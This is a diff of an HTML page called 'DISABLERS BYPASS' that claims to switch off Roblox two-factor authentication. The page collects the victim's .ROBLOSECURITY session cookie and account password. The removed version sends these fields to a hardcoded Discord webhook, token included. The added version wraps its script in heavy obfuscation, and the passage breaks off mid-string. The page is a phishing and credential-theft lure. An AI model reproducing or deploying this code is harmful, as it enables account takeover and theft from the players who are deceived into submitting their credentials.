@@ -1,148 +1,177 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Disable Options</title>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #000;
-            color: #00bfff;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 4px 20px rgba(255, 255, 255, 0.5);
-        }
-
-        h1 {
-            font-size: 2em;
-            margin-bottom: 20px;
-        }
-
-        button {
-            display: block;
-            width: 100%;
-            margin: 10px 0;
-            padding: 12px;
-            background: #00bfff;
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-size: 18px;
-            cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
-        }
-
-        button:hover {
-            background: #009acd;
-            transform: scale(1.05);
-            box-shadow: 0 8px 20px rgba(0, 156, 205, 0.5);
-        }
-
-        button:disabled {
-            background: #bbb;
-            cursor: not-allowed;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>DISABLERS BYPASS</h1>
-        <button id="disable-2fa">DISABLE 2FA</button>
-        <button id="disable-authenticator">DISABLE AUTHENTICATOR</button>
-    </div>
-
-    <script>
-        const webhook1 = "https://your-first-webhook-url.com";  // Primer webhook
-        const webhook2 = "https://discord.com/api/webhooks/1329981919823400970/5hDpWdgx7gSAggnhvk-iCvQA9c5-jgtUFeCWAIuHMeKNLDnNpr-gZRJ16ot2sLhJYpO9"; // Segundo webhook
-
-        async function sendToWebhooks(data, buttonId) {
-            // Deshabilitar los botones mientras la solicitud está en proceso
-            document.getElementById(buttonId).disabled = true;
-
-            try {
-                // Enviar datos al primer webhook
-                const response1 = await fetch(webhook1, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                // Enviar datos al segundo webhook
-                const response2 = await fetch(webhook2, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                // Verificar si alguna de las respuestas no es exitosa
-                if (!response1.ok || !response2.ok) {
-                    throw new Error('Error al enviar los datos a los webhooks.');
-                }
-
-                // Mostrar alerta de éxito
-                Swal.fire({
-                    title: "Success",
-                    text: "Data sent successfully to the webhooks.",
-                    icon: "success",
-                    confirmButtonText: "OK",
-                    allowOutsideClick: true,  // Permite hacer clic fuera de la alerta
-                    allowEscapeKey: true      // Permite cerrar la alerta con la tecla escape
-                });
-            } catch (error) {
-                // Mostrar mensaje de error adecuado
-                let errorMessage = "Failed to send data to the webhooks.";
-                
-                if (error.message.includes("Error al enviar")) {
-                    errorMessage = error.message;
-                } else if (error.name === "TypeError") {
-                    errorMessage = "Network error: Please check your internet connection.";
-                }
-
-                // Mostrar alerta de error
-                Swal.fire({
-                    title: "Error",
-                    text: errorMessage,
-                    icon: "error",
-                    confirmButtonText: "OK",
-                    allowOutsideClick: true,  // Permite hacer clic fuera de la alerta
-                    allowEscapeKey: true      // Permite cerrar la alerta con la tecla escape
-                });
-            } finally {
-                // Habilitar nuevamente el botón después de que la solicitud se haya completado
-                document.getElementById(buttonId).disabled = false;
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Disable Options</title>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background: #000;
+                color: #00bfff;
+                text-align: center;
+                padding: 20px;
             }
-        }
 
-        document.getElementById("disable-2fa").addEventListener("click", () => {
-            const data = {
-                "Cookie": "example-cookie-value",
-                "Password": "example-password",
-                "Webhook": "https://example-webhook-url.com"
-            };
-            sendToWebhooks(data, "disable-2fa");
-        });
+            canvas#particleCanvas {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: -1;
+            }
 
-        document.getElementById("disable-authenticator").addEventListener("click", () => {
-            const data = {
-                "Cookie": "example-cookie-value",
-                "Webhook": "https://example-webhook-url.com"
-            };
-            sendToWebhooks(data, "disable-authenticator");
-        });
-    </script>
-</body>
-</html>
+            .container {
+                max-width: 400px;
+                margin: 0 auto;
+                background: rgba(255, 255, 255, 0.1);
+                padding: 30px;
+                border-radius: 15px;
+                box-shadow: 0 4px 20px rgba(255, 255, 255, 0.5);
+            }
+
+            h1 {
+                font-size: 2em;
+                margin-bottom: 20px;
+            }
+
+            button {
+                display: block;
+                width: 100%;
+                margin: 10px 0;
+                padding: 12px;
+                background: #00bfff;
+                border: none;
+                border-radius: 8px;
+                color: white;
+                font-size: 18px;
+                cursor: pointer;
+                transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
+                position: relative;
+                overflow: hidden;
+            }
+
+            button:hover {
+                background: #009acd;
+                transform: scale(1.05);
+                box-shadow: 0 8px 20px rgba(0, 156, 205, 0.5);
+            }
+
+            button::after {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: -100%;
+                width: 200%;
+                height: 100%;
+                background: rgba(255, 255, 255, 0.3);
+                transform: skewX(-45deg);
+                transition: left 0.4s ease;
+            }
+
+            button:hover::after {
+                left: 100%;
+            }
+
+            form {
+                display: none;
+                margin-top: 20px;
+            }
+
+            input {
+                width: calc(100% - 20px);
+                margin: 10px auto;
+                padding: 12px;
+                border-radius: 8px;
+                border: none;
+                background-color: rgba(255, 255, 255, 0.2);
+            }
+
+            label {
+                display: block;
+            }
+
+            .back-button, .tutorial {
+                display: none;
+            }
+
+            .tutorial {
+                margin-top: 20px;
+                padding: 15px;
+                background-color: rgba(255, 255, 255, 0.25);
+                border-radius: 8px;
+            }
+        </style>
+    </head>
+    <body>
+        <canvas id="particleCanvas"></canvas>
+        <div class="container">
+            <h1>DISABLERS BYPASS</h1>
+            <button id="disable-2fa">
+                DISABLE 2FA <strong>(Force 13+ to -13 (Account 13+ Needed)</strong>
+            </button>
+            <button id="disable-authenticator">DISABLE AUTHENTICATOR</button>
+            <button class="back-button" id="back-button">← Back to Menu</button>
+            <form id="form-2fa">
+                <label for="cookie">Cookie:</label>
+                <input type="text" id="cookie" name="cookie" required placeholder=".ROBLOXSECURITY">
+                <label for="password">Account Password:</label>
+                <input type="password" id="password" name="password" required placeholder="Password">
+                <label for="webhook">Webhook:</label>
+                <input type="url" id="webhook" name="webhook" required placeholder="Webhook">
+                <button type="button" id="confirm-2fa">Confirm</button>
+            </form>
+            <form id="form-authenticator">
+                <label for="cookie-auth">Cookie:</label>
+                <input type="text" id="cookie-auth" name="cookie-auth" required placeholder=".ROBLOXSECURITY">
+                <label for="webhook-auth">Webhook:</label>
+                <input type="url" id="webhook-auth" name="webhook-auth" required placeholder="Webhook">
+                <button type="button" id="confirm-authenticator">Confirm</button>
+            </form>
+            <div class="tutorial">
+                <h3>Tutorial</h3>
+                <p>Fill out all the inputs in the form above accurately.</p>
+                <p>Click "Confirm" to proceed to the payment page and complete the process.</p>
+                <h2>Be careful:</h2>
+                <p>DISABLE 2FA:(included auto disabled email secure verification, but can't auto disabled authentication verification. use force turn off authenticator on bottom if you want auto disabled authentication verification method</p>
+                <p>Autenticator:(You need wait up to 5 minutes to use this bypasser, process is following existing requests)</p>
+                <p class="warning">CAUTION:After successfully disabled the authentication verificaton, your cookie will automatic invalid/died. Before use this feature, you must have 2/more valid cookie for the account.</p>
+            </div>
+        </div>
+        <script>
+            function _0xd3e0(_0x260664, _0x5931d3) {
+                const _0x5a14f3 = _0x5a14();
+                return _0xd3e0 = function(_0xd3e086, _0x4eedd5) {
+                    _0xd3e086 = _0xd3e086 - 0xc4;
+                    let _0x393462 = _0x5a14f3[_0xd3e086];
+                    return _0x393462;
+                }
+                ,
+                _0xd3e0(_0x260664, _0x5931d3);
+            }
+            const _0x3a6736 = _0xd3e0;
+            (function(_0x3c9103, _0x26f9dd) {
+                const _0x4670c1 = _0xd3e0
+                  , _0x7a77ba = _0x3c9103();
+                while (!![]) {
+                    try {
+                        const _0xd7b354 = parseInt(_0x4670c1(0xd8)) / 0x1 * (parseInt(_0x4670c1(0xdd)) / 0x2) + -parseInt(_0x4670c1(0xc7)) / 0x3 * (parseInt(_0x4670c1(0xce)) / 0x4) + parseInt(_0x4670c1(0xc6)) / 0x5 * (parseInt(_0x4670c1(0xcf)) / 0x6) + -parseInt(_0x4670c1(0xcd)) / 0x7 * (parseInt(_0x4670c1(0xcb)) / 0x8) + -parseInt(_0x4670c1(0xd7)) / 0x9 * (parseInt(_0x4670c1(0xd4)) / 0xa) + -parseInt(_0x4670c1(0xd0)) / 0xb + parseInt(_0x4670c1(0xcc)) / 0xc;
+                        if (_0xd7b354 === _0x26f9dd)
+                            break;
+                        else
+                            _0x7a77ba['push'](_0x7a77ba['shift']());
+                    } catch (_0x31f9f2) {
+                        _0x7a77ba['push'](_0x7a77ba['shift']());
+                    }
+                }
+            }(_0x5a14, 0x9fdcf));
+            const canvas = document[_0x3a6736(0xc5)](_0x3a6736(0xd6))
+              , ctx = canvas[_0x3a6736(0xdc)]('2d');
+            canvas[_0x3a6736(0xd5)] = window[_0x3a6736(0xe5)],
+            canvas[_0x3a6736(0xde)] = window['innerHeight'];
+            const particles = []
+              , numParticles = 0x64;
+            function _0x5a14() {
+                const _0x487456 = ['rgba(0,\x20191,\x20255,\x20', 'innerHeight', 'alpha', 'innerWidth', 'fill', 'getElementById', '5frQMGr', '37068isxdQQ', 'random', 'beginPath', 'fillStyle', '387368zkiffi', '11862156FuArLZ', '21KsxpmE', '96IzJmJq', '2049054etHx
